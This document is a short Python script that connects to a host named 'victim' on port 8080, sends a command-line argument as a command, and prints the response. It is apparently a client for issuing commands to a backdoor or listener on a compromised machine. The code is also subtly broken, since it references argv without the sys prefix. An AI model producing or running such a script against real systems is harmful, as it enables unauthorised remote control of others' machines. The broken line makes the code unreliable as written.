import socket
import sys

host = 'victim'
port = 8080

s = socket.socket()
s.connect((host, port))

cmd = argv[1]
s.send(cmd.encode())

output = s.recv(1024).decode()
print(output)

s.close()
